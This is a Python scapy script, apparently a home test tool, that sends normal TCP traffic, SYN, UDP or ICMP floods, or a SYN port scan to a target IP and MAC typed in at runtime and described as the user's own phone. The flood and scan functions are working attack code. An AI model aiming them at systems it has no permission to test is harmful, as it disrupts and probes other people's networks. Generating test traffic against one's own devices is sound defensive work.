import scapy.all as scapy
import time
import random

def send_packet(packet):
    try:
        scapy.sendp(packet, verbose=False)
    except PermissionError:
        print("Permission error. Try running as administrator/root.")
    except Exception as e:
        print(f"Error sending packet: {e}")

def simulate_normal_traffic(target_ip, source_ip, target_mac, duration):
    end_time = time.time() + duration
    while time.time() < end_time:
        packet = scapy.Ether(dst=target_mac) / scapy.IP(dst=target_ip, src=source_ip) / scapy.TCP(dport=80, sport=random.randint(1024, 65535))
        send_packet(packet)
        time.sleep(random.uniform(0.1, 1))
    print("Normal traffic simulation finished")

def simulate_syn_flood(target_ip, source_ip, target_mac, duration):
    end_time = time.time() + duration
    while time.time() < end_time:
        packet = scapy.Ether(dst=target_mac) / scapy.IP(dst=target_ip, src=source_ip) / scapy.TCP(dport=80, sport=random.randint(1024, 65535), flags="S")
        send_packet(packet)
        time.sleep(0.01)
    print("SYN flood simulation finished")

def simulate_udp_flood(target_ip, source_ip, target_mac, duration):
    end_time = time.time() + duration
    while time.time() < end_time:
        packet = scapy.Ether(dst=target_mac) / scapy.IP(dst=target_ip, src=source_ip) / scapy.UDP(dport=random.randint(1024, 65535))
        send_packet(packet)
        time.sleep(0.01)
    print("UDP flood simulation finished")

def simulate_icmp_flood(target_ip, source_ip, target_mac, duration):
    end_time = time.time() + duration
    while time.time() < end_time:
        packet = scapy.Ether(dst=target_mac) / scapy.IP(dst=target_ip, src=source_ip) / scapy.ICMP()
        send_packet(packet)
        time.sleep(0.01)
    print("ICMP flood simulation finished")

def simulate_port_scan(target_ip, source_ip, target_mac, duration, ports_to_scan=[21, 22, 80, 443, 12345]):
    end_time = time.time() + duration
    while time.time() < end_time:
        port = random.choice(ports_to_scan)
        packet = scapy.Ether(dst=target_mac) / scapy.IP(dst=target_ip, src=source_ip) / scapy.TCP(dport=port, sport=random.randint(1024, 65535), flags="S")
        send_packet(packet)
        time.sleep(0.05)
    print("Port scan simulation finished")

if __name__ == "__main__":
    target_ip = input("Enter target IP (your phone's IP): ")
    source_ip = input("Enter source IP (your PC's IP): ")
    target_mac = input("Enter target MAC address (your phone's MAC): ").replace('-', ':')
    print("Choose simulation mode:")
    print("1. Normal Traffic")
    print("2. SYN Flood")
    print("3. UDP Flood")
    print("4. ICMP Flood")
    print("5. Port Scan")
    choice = int(input("Enter your choice: "))
    duration_input = input("Enter simulation duration (10s, 30s, 1m, 5m, inf): ")
    if duration_input == "inf":
        duration = float('inf')
    else:
        duration = int(duration_input[:-1])
        if "m" in duration_input:
            duration *= 60
    print(f"Sending {['realistic normal', 'SYN flood', 'UDP flood', 'ICMP flood', 'Port scan'][choice-1]} traffic to {target_ip} for {duration_input} seconds...")
    if choice == 1:
        simulate_normal_traffic(target_ip, source_ip, target_mac, duration)
    elif choice == 2:
        simulate_syn_flood(target_ip, source_ip, target_mac, duration)
    elif choice == 3:
        simulate_udp_flood(target_ip, source_ip, target_mac, duration)
    elif choice == 4:
        simulate_icmp_flood(target_ip, source_ip, target_mac, duration)
    elif choice == 5:
        simulate_port_scan(target_ip, source_ip, target_mac, duration)
